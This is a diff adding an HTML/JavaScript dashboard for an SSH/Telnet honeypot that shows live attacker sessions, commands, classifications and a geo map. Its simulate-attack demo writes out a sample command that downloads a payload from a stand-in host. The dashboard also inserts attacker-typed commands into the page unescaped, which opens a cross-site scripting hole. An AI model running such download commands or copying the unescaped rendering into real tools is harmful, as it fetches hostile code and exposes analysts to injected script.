@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <title>HoneyWatch — Threat Intelligence Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --font-body: 'Outfit', sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+      --bg: #F5F4F1;
+      --surface: #FFFFFF;
+      --surface-2: #F3F1EC;
+      --surface-3: #EAE7DF;
+
+      --border: rgba(0, 0, 0, 0.4);
+      --border-strong: rgba(0, 0, 0, 0.7);
+
+      --text-primary: #1F1F1F;
+      --text-secondary: #5F5B55;
+      --text-muted: #9A968F;
+
+      --red: #B84A3A;
+      --red-light: #F8EAEA;
+      --orange: #B07A2A;
+      --orange-light: #F6EFE3;
+      --blue: #3A6EA5;
+      --blue-light: #E8F0FA;
+      --green: #4F7D5C;
+      --green-light: #EDF5EF;
+      --gray-mid: #7E7B75;
+      --gray-light: #ECEAE5;
+      --accent: #B84A3A;
+
+      --radius-sm: 2px 5px 3px 4px/5px 3px 4px 2px;
+      --radius-md: 3px 6px 4px 5px/6px 4px 5px 3px;
+      --radius-lg: 4px 8px 5px 6px/8px 5px 6px 4px;
+    }
+
+    body {
+      font-family: var(--font-body);
+      background: var(--bg);
+      color: var(--text-primary);
+      min-height: 100vh;
+      font-size: 18px;
+      line-height: 1.5;
+      letter-spacing: 0.5px;
+    }
+
+    /* ── HEADER ── */
+    .hdr {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border-strong);
+      padding: 14px 28px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .hdr-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo-badge {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      background: var(--red-light);
+      border: 1px solid var(--red);
+      border-radius: var(--radius-sm);
+      padding: 6px 11px;
+    }
+
+    .logo-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--red);
+      animation: pulse 1.8s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1) }
+      50% { opacity: 0.5; transform: scale(1.4) }
+    }
+
+    .logo-text {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--red);
+      letter-spacing: -0.2px;
+    }
+
+    .hdr-title {
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+
+    .hdr-sub {
+      font-size: 11px;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+      margin-top: 1px;
+    }
+
+    .hdr-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .status-pill {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 5px 13px;
+      border-radius: 20px;
+      background: var(--green-light);
+      border: 1px solid #B2D9B2;
+      color: var(--green);
+    }
+
+    .status-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      animation: pulse 2s infinite;
+    }
+
+    .sensor-chips { display: flex; gap: 6px; }
+
+    .chip {
+      font-size: 10px;
+      font-weight: 500;
+      font-family: var(--font-mono);
+      padding: 3px 8px;
+      border-radius: 4px;
+      background: var(--surface-2);
+      border: 1px solid var(--border);
+      color: var(--text-secondary);
+    }
+
+    /* ── METRICS ROW ── */
+    .metrics {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 14px;
+      padding: 20px 28px;
+    }
+
+    .metric-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 16px 18px;
+    }
+
+    .metric-label {
+      font-size: 11px;
+      font-weight: 500;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      margin-bottom: 6px;
+    }
+
+    .metric-val {
+      font-size: 30px;
+      font-weight: 700;
+      font-family: var(--font-mono);
+      color: var(--text-primary);
+    }
+
+    .metric-val.red { color: var(--red); }
+    .metric-val.orange { color: var(--orange); }
+    .metric-val.green { color: var(--green); }
+
+    .metric-sub {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 3px;
+    }
+
+    .tl-segs { display: flex; gap: 3px; margin-top: 8px; }
+    .tl-seg {
+      height: 7px; flex: 1; border-radius: 3px; background: var(--surface-3); transition: background 0.5s;
+    }
+    .tl-seg.low { background: #5A9A5A; }
+    .tl-seg.med { background: #C47A1A; }
+    .tl-seg.high { background: var(--red); }
+
+    /* ── MAIN GRID ── */
+    .main {
+      display: grid;
+      grid-template-columns: 1fr 300px;
+      gap: 14px;
+      padding: 0 28px 20px;
+    }
+
+    /* ── LEFT PANEL ── */
+    .left-panel { display: flex; flex-direction: column; gap: 14px; }
+    .card {
+      background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-lg);
+      overflow: hidden; box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+    }
+    .card-hdr {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 12px 16px; border-bottom: 1px solid var(--border); background: var(--surface-2);
+    }
+    .card-title {
+      font-size: 11px; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.7px;
+    }
+    .card-badge {
+      font-size: 10px; font-family: var(--font-mono); background: var(--surface-3); border: 1px solid var(--border);
+      color: var(--text-muted); padding: 2px 8px; border-radius: 20px;
+    }
+
+    .feed-cols {
+      display: grid; grid-template-columns: 120px 76px 1fr 80px 80px; padding: 7px 16px;
+      border-bottom: 1px solid var(--border); background: var(--surface-2);
+    }
+    .feed-col-label { font-size: 10px; font-weight: 500; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+
+    .feed-list { height: 228px; overflow-y: auto; }
+    .feed-list::-webkit-scrollbar { width: 4px; }
+    .feed-list::-webkit-scrollbar-thumb { background: var(--border-strong); border-radius: 2px; }
+
+    .feed-row {
+      display: grid; grid-template-columns: 120px 76px 1fr 80px 80px; align-items: center;
+      padding: 7px 16px; border-bottom: 1px solid var(--border); font-family: var(--font-mono);
+      font-size: 11px; animation: slideIn 0.35s ease; transition: background 0.2s;
+    }
+    .feed-row:hover { background: var(--surface-2); }
+    .feed-row.new { background: #FEF5F5; }
+
+    @keyframes slideIn { from { opacity: 0; transform: translateY(-5px) } to { opacity: 1; transform: translateY(0) } }
+
+    .feed-ip { color: var(--text-primary); font-weight: 500; }
+    .feed-time { color: var(--text-muted); }
+    .feed-cmd { color: var(--text-secondary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+    .tag {
+      display: inline-flex; align-items: center; justify-content: center; padding: 2px 8px; border-radius: 20px;
+      font-size: 10px; font-weight: 600; font-family: var(--font-body); white-space: nowrap; border: 1px solid; width: fit-content;
+    }
+    .tag-bot { background: #EAF2FA; color: #3A6EA5; border-color: #D2E2F3; }
+    .tag-human { background: #EDF5EF; color: #4F7D5C; border-color: #D6E8DB; }
+    .tag-apt { background: #F8EAEA; color: #B84A3A; border-color: #F1D3CF; }
+    .tag-scanner { background: #F0EFEA; color: #6E6B66; border-color: #E2E0DA; }
+
+    .terminal { background: #FAFAF8; border-radius: 0 0 var(--radius-lg) var(--radius-lg); padding: 12px 16px; }
+    .term-bar { display: flex; align-items: center; gap: 6px; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 0, 0, 0.07); }
+    .term-dot { width: 9px; height: 9px; border-radius: 50%; }
+    .term-label { font-size: 11px; font-family: var(--font-mono); color: #666; }
+    .term-line { font-family: var(--font-mono); font-size: 11px; color: #333; padding: 2px 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .term-line .prompt { color: #E8876A; margin-right: 7px; }
+    .term-line.active-line { color: #000; }
+
+    /* ── RIGHT PANEL ── */
+    .right-panel { display: flex; flex-direction: column; gap: 14px; }
+    .class-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+    .class-label { font-size: 12px; color: var(--text-secondary); width: 58px; flex-shrink: 0; }
+    .class-track { flex: 1; height: 8px; background: var(--surface-3); border-radius: 4px; overflow: hidden; }
+    .class-fill { height: 100%; border-radius: 4px; transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
+    .class-count { font-size: 11px; font-family: var(--font-mono); color: var(--text-secondary); width: 22px; text-align: right; flex-shrink: 0; }
+
+    .geo-map { position: relative; width: 100%; height: 180px; background: #EFF4FB; border-radius: 10px; border: 1px solid #D0DFF2; margin-top: 10px; }
+    .geo-legend { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
+    .geo-leg-item { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-secondary); }
+    .geo-leg-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+
+    .origin-row { display: flex; align-items: center; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+    .origin-row:last-child { border-bottom: none; }
+    .origin-country { color: var(--text-primary); }
+    .origin-bar-wrap { flex: 1; margin: 0 10px; height: 4px; background: var(--surface-3); border-radius: 2px; overflow: hidden; }
+    .origin-bar { height: 100%; background: #A8C4E8; border-radius: 2px; transition: width 1s ease; }
+    .origin-count { font-family: var(--font-mono); font-size: 10px; color: var(--text-muted); }
+
+    /* ── FOOTER ── */
+    .footer { background: var(--surface); border-top: 1px solid var(--border-strong); padding: 14px 28px; display: flex; align-items: center; justify-content: space-between; }
+    .footer-sys { font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); }
+    .blink { animation: blink 1s step-end infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1 } 50% { opacity: 0 } }
+
+    .btn-demo { display: flex; align-items: center; gap: 8px; padding: 9px 20px; background: var(--red); color: #fff; border: none; border-radius: var(--radius-md); font-size: 13px; font-weight: 500; font-family: var(--font-body); cursor: pointer; transition: background 0.2s, transform 0.1s; letter-spacing: -0.1px; }
+    .btn-demo:hover { background: #A0291F; }
+    .btn-demo:active { transform: scale(0.97); }
+    .btn-demo:disabled { background: var(--gray-mid); cursor: default; }
+
+    /* Toast */
+    .toast { position: fixed; top: 20px; right: 20px; background: var(--surface); border: 1px solid var(--border-strong); border-radius: var(--radius-md); padding: 11px 18px; font-size: 13px; color: var(--text-primary); box-shadow: 0 4px 20px rgba(0, 0, 0, 0.10); transform: translateY(-90px); transition: transform 0.35s ease; z-index: 999; display: flex; align-items: center; gap: 9px; }
+    .toast.show { transform: translateY(0); }
+    .toast-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); flex-shrink: 0; animation: pulse 1s infinite; }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="hdr">
+    <div class="hdr-left">
+      <div class="logo-badge">
+        <div class="logo-dot"></div>
+        <span class="logo-text">HoneyWatch</span>
+      </div>
+      <div>
+        <div class="hdr-title">Threat Intelligence Dashboard</div>
+        <div class="hdr-sub" id="sys-time">SYS 00:00:00 UTC &nbsp;|&nbsp; Node: hpot-prod-01 &nbsp;|&nbsp; OS: <span id="current-os">Linux</span></div>
+      </div>
+    </div>
+    <div class="hdr-right">
+      <div class="sensor-chips">
+        <span class="chip">SSH:2222</span>
+        <span class="chip">Telnet:2223</span>
+      </div>
+      <div class="status-pill">
+        <div class="status-dot"></div> Live monitoring
+      </div>
+    </div>
+  </header>
+
+  <!-- METRICS -->
+  <section class="metrics">
+    <div class="metric-card">
+      <div class="metric-label">Active Threats</div>
+      <div class="metric-val red" id="m-active">0</div>
+      <div class="metric-sub" id="m-active-sub">Real-time sessions</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-label">Unique IPs</div>
+      <div class="metric-val orange" id="m-ips">0</div>
+      <div class="metric-sub">Across all regions</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-label">Commands Logged</div>
+      <div class="metric-val" id="m-cmds">0</div>
+      <div class="metric-sub">Since system start</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-label">Threat Level</div>
+      <div class="metric-val green" id="m-tl-val">LOW</div>
+      <div class="tl-segs">
+        <div class="tl-seg" id="tl1"></div>
+        <div class="tl-seg" id="tl2"></div>
+        <div class="tl-seg" id="tl3"></div>
+        <div class="tl-seg" id="tl4"></div>
+        <div class="tl-seg" id="tl5"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- MAIN GRID -->
+  <main class="main">
+
+    <!-- LEFT -->
+    <div class="left-panel">
+      <!-- Live feed -->
+      <div class="card">
+        <div class="card-hdr">
+          <span class="card-title">Live attack feed</span>
+          <span class="card-badge" id="feed-count">0 events</span>
+        </div>
+        <div class="feed-cols">
+          <span class="feed-col-label">Attacker IP</span>
+          <span class="feed-col-label">Time</span>
+          <span class="feed-col-label">Command / Payload</span>
+          <span class="feed-col-label">Class</span>
+          <span class="feed-col-label">Risk</span>
+        </div>
+        <div class="feed-list" id="feed-list"></div>
+
+        <!-- Terminal capture -->
+        <div class="terminal">
+          <div class="term-bar">
+            <div class="term-dot" style="background:#FF5F57;"></div>
+            <div class="term-dot" style="background:#FEBC2E;"></div>
+            <div class="term-dot" style="background:#28C840;"></div>
+            <span class="term-label" id="term-session">Live Terminal Interception...</span>
+          </div>
+          <div id="term-lines">
+            <div class="term-line"><span style="color:rgba(0,0,0,0.4);">Awaiting command execution...</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT -->
+    <div class="right-panel">
+
+      <!-- Classification -->
+      <div class="card">
+        <div class="card-hdr"><span class="card-title">Attacker classification</span></div>
+        <div style="padding:14px 16px;">
+          <div class="class-row">
+            <span class="class-label">Bots</span>
+            <div class="class-track">
+              <div class="class-fill" id="bar-bot" style="width:0%;background:#5B9BD5;"></div>
+            </div>
+            <span class="class-count" id="cnt-bot">0</span>
+          </div>
+          <div class="class-row">
+            <span class="class-label">Humans</span>
+            <div class="class-track">
+              <div class="class-fill" id="bar-human" style="width:0%;background:#5A9A5A;"></div>
+            </div>
+            <span class="class-count" id="cnt-human">0</span>
+          </div>
+          <div class="class-row">
+            <span class="class-label">APT</span>
+            <div class="class-track">
+              <div class="class-fill" id="bar-apt" style="width:0%;background:#C0392B;"></div>
+            </div>
+            <span class="class-count" id="cnt-apt">0</span>
+          </div>
+          <div class="class-row" style="margin-bottom:0;">
+            <span class="class-label">Scanners</span>
+            <div class="class-track">
+              <div class="class-fill" id="bar-scan" style="width:0%;background:#888680;"></div>
+            </div>
+            <span class="class-count" id="cnt-scan">0</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Geo map -->
+      <div class="card">
+        <div class="card-hdr"><span class="card-title">Geo-IP origin map</span></div>
+        <div style="padding:14px 16px 16px;">
+          <div class="geo-map" id="geo-map">
+            <div id="map" style="height: 180px; border-radius:10px; width:100%;"></div>
+          </div>
+          <div class="geo-legend">
+            <div class="geo-leg-item"><div class="geo-leg-dot" style="background:#C0392B;"></div>APT</div>
+            <div class="geo-leg-item"><div class="geo-leg-dot" style="background:#1A5FA8;"></div>Bot</div>
+            <div class="geo-leg-item"><div class="geo-leg-dot" style="background:#2D6A2D;"></div>Human</div>
+            <div class="geo-leg-item"><div class="geo-leg-dot" style="background:#888680;"></div>Scanner</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Top origins -->
+      <div class="card">
+        <div class="card-hdr"><span class="card-title">Top origin countries</span></div>
+        <div style="padding:8px 16px 12px;" id="origins-list">
+          <div class="origin-row"><span class="origin-country" style="color:var(--text-muted);font-size:12px;">Real-time location data loading...</span></div>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-sys">
+      Honeypot sensors active &nbsp;<span class="blink">▐</span>&nbsp; All traffic captured &amp; classified in real-time
+    </div>
+    <button class="btn-demo" id="demo-btn" onclick="triggerDemo()">
+      <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
+        <circle cx="6.5" cy="6.5" r="5.5" stroke="white" stroke-width="1.2" />
+        <path d="M5 4.5L9 6.5L5 8.5V4.5Z" fill="white" />
+      </svg>
+      Simulate attack
+    </button>
+  </footer>
+
+  <div class="toast" id="toast">
+    <div class="toast-dot"></div>
+    <span id="toast-msg"></span>
+  </div>
+
+  <script>
+    // System Time
+    function nowUTC() {
+      const n = new Date();
+      return [n.getUTCHours(), n.getUTCMinutes(), n.getUTCSeconds()]
+        .map(x => String(x).padStart(2, '0')).join(':');
+    }
+    setInterval(() => {
+      document.getElementById('sys-time').innerHTML = `SYS ${nowUTC()} UTC &nbsp;|&nbsp; Node: hpot-prod-01 &nbsp;|&nbsp; OS: <span id="current-os">Linux</span>`;
+    }, 1000);
+
+    function showToast(msg) {
+      document.getElementById('toast-msg').textContent = msg;
+      const t = document.getElementById('toast');
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 3000);
+    }
+
+    // Map Init
+    const map = L.map('map').setView([20, 0], 1.5);
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
+      maxZoom: 10,
+    }).addTo(map);
+
+    const colors = { 'APT': '#C0392B', 'Bot': '#1A5FA8', 'Human': '#2D6A2D', 'Scanner': '#888680' };
+    const tagMap = { 'Bot': 'tag-bot', 'Human': 'tag-human', 'APT': 'tag-apt', 'Scanner': 'tag-scanner' };
+
+    let displayedSessionIds = new Set();
+    let markers = {};
+
+    function addGeoDot(type, ip, sid) {
+        if(markers[sid]) return; // Already plotted
+        
+        // Simple hash to derive consistent coordinates from IP
+        let lat = 0; let lng = 0;
+        if (ip && ip !== "Unknown") {
+            const parts = ip.split('.');
+            if(parts.length===4) {
+               lat = (parseInt(parts[0]) % 120) - 60;
+               lng = (parseInt(parts[1]) % 360) - 180;
+            }
+        }
+        
+        const marker = L.circleMarker([lat, lng], { radius: 6, color: colors[type] || colors['Scanner'], fillOpacity: 0.7 }).addTo(map);
+        if (ip) {
+            marker.bindTooltip(ip, { permanent: false, direction: 'right' });
+        }
+        markers[sid] = marker;
+    }
+
+    async function fetchBackendData() {
+        try {
+            const osRes = await fetch('/api/system/os');
+            const osData = await osRes.json();
+            const osEl = document.getElementById('current-os');
+            if(osEl) osEl.innerText = osData.current_os;
+
+            const res = await fetch('/api/sessions');
+            const sessions = await res.json();
+            
+            let totalActive = 0;
+            let ips = new Set();
+            let totalCmds = 0;
+            let stats = { 'Bot': 0, 'Human': 0, 'APT': 0, 'Scanner': 0 };
+
+            const feedList = document.getElementById('feed-list');
+            let newRowsHtml = '';
+
+            // Reverse iterate to show newest first
+            const sids = Object.keys(sessions).reverse();
+            
+            sids.forEach(sid => {
+                const s = sessions[sid];
+                totalActive++;
+                if (s.src_ip && s.src_ip !== "Unknown") ips.add(s.src_ip);
+                totalCmds += s.commands.length;
+
+                // Map Backend ML Classes to Frontend Classes
+                let type = 'Scanner';
+                if (s.classification === 'ADVANCED_THREAT') type = 'APT';
+                else if (s.classification === 'AUTOMATED_BOT') type = 'Bot';
+                else if (s.classification === 'EXPLORATORY') type = 'Human';
+
+                stats[type]++;
+
+                // Add to Map
+                addGeoDot(type, s.src_ip, sid);
+
+                // Add to feed if it's new
+                if (!displayedSessionIds.has(sid) && s.commands.length > 0) {
+                    displayedSessionIds.add(sid);
+                    const latestCmd = s.commands[s.commands.length - 1];
+                    const risk = s.risk_score;
+                    const highlight = type === 'APT' ? 'new' : '';
+                    
+                    newRowsHtml += `
+                      <div class="feed-row ${highlight}">
+                        <span class="feed-ip">${s.src_ip}</span>
+                        <span class="feed-time">${s.start_time.split('T')[1].substring(0,8)}</span>
+                        <span class="feed-cmd">${latestCmd}</span>
+                        <span class="tag ${tagMap[type]}">${type}</span>
+                        <span style="font-size:11px;color:${risk > 10 ? '#B84A3A' : risk > 5 ? '#B07A2A' : '#4F7D5C'};">${risk}</span>
+                      </div>
+                    `;
+
+                    // Update Terminal visual
+                    const termContainer = document.getElementById('term-lines');
+                    termContainer.innerHTML += `<div class="term-line"><span class="prompt">$</span>${latestCmd}</div>`;
+                    if (termContainer.childElementCount > 15) termContainer.removeChild(termContainer.firstChild);
+                    document.getElementById('term-session').textContent = `Session: ${s.src_ip}`;
+                }
+            });
+
+            if (newRowsHtml !== '') {
+                feedList.innerHTML = newRowsHtml + feedList.innerHTML;
+            }
+
+            // Update Metrics
+            document.getElementById('m-active').textContent = totalActive;
+            document.getElementById('m-ips').textContent = ips.size;
+            document.getElementById('m-cmds').textContent = totalCmds;
+            document.getElementById('feed-count').textContent = totalActive + ' events';
+
+            const total = totalActive || 1;
+            const pct = v => Math.round(v / total * 100);
+            
+            document.getElementById('bar-bot').style.width = pct(stats.Bot) + '%';
+            document.getElementById('bar-human').style.width = pct(stats.Human) + '%';
+            document.getElementById('bar-apt').style.width = pct(stats.APT) + '%';
+            document.getElementById('bar-scan').style.width = pct(stats.Scanner) + '%';
+            
+            document.getElementById('cnt-bot').textContent = stats.Bot;
+            document.getElementById('cnt-human').textContent = stats.Human;
+            document.getElementById('cnt-apt').textContent = stats.APT;
+            document.getElementById('cnt-scan').textContent = stats.Scanner;
+
+            // Threat level logic
+            let lv = Math.min(5, Math.floor(stats.APT * 1.8 + stats.Human * 1.2 + stats.Bot * 0.25 + stats.Scanner * 0.08) || 1);
+            const tl = document.getElementById('m-tl-val');
+            [1, 2, 3, 4, 5].forEach(i => {
+              const el = document.getElementById('tl' + i);
+              el.className = 'tl-seg';
+              if (i <= lv) { el.classList.add(lv <= 2 ? 'low' : lv <= 3 ? 'med' : 'high'); }
+            });
+            if (lv <= 2) { tl.textContent = 'LOW'; tl.className = 'metric-val green'; }
+            else if (lv <= 3) { tl.textContent = 'MEDIUM'; tl.className = 'metric-val orange'; }
+            else { tl.textContent = 'HIGH'; tl.className = 'metric-val red'; }
+
+        } catch (e) {
+            console.error("Dashboard Poll Error:", e);
+        }
+    }
+
+    // Demo Attack trigger (simulate UI effect)
+    function triggerDemo() {
+        const btn = document.getElementById('demo-btn');
+        btn.disabled = true;
+        btn.textContent = 'Simulating...';
+        showToast('Attack simulation initiated — Connect via SSH on Port 2222');
+        
+        // Add fake local event just to show immediate interaction
+        const feedList = document.getElementById('feed-list');
+        feedList.innerHTML = `
+          <div class="feed-row new">
+            <span class="feed-ip">104.236.76.42</span>
+            <span class="feed-time">${nowUTC()}</span>
+            <span class="feed-cmd">wget http://malware.local/payload</span>
+            <span class="tag tag-apt">APT</span>
+            <span style="font-size:11px;color:#B84A3A;">99</span>
+          </div>
+        ` + feedList.innerHTML;
+
+        addGeoDot('APT', '104.236.76.42', 'demo-session-' + Date.now());
+
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.innerHTML = `<svg width="13" height="13" viewBox="0 0 13 13" fill="none"><circle cx="6.5" cy="6.5" r="5.5" stroke="white" stroke-width="1.2" /><path d="M5 4.5L9 6.5L5 8.5V4.5Z" fill="white" /></svg> Simulate attack`;
+        }, 3000);
+    }
+
+    // Auto Refresh every 2 seconds
+    setInterval(fetchBackendData, 2000);
+    fetchBackendData();
+
+  </script>
+</body>
+</html>
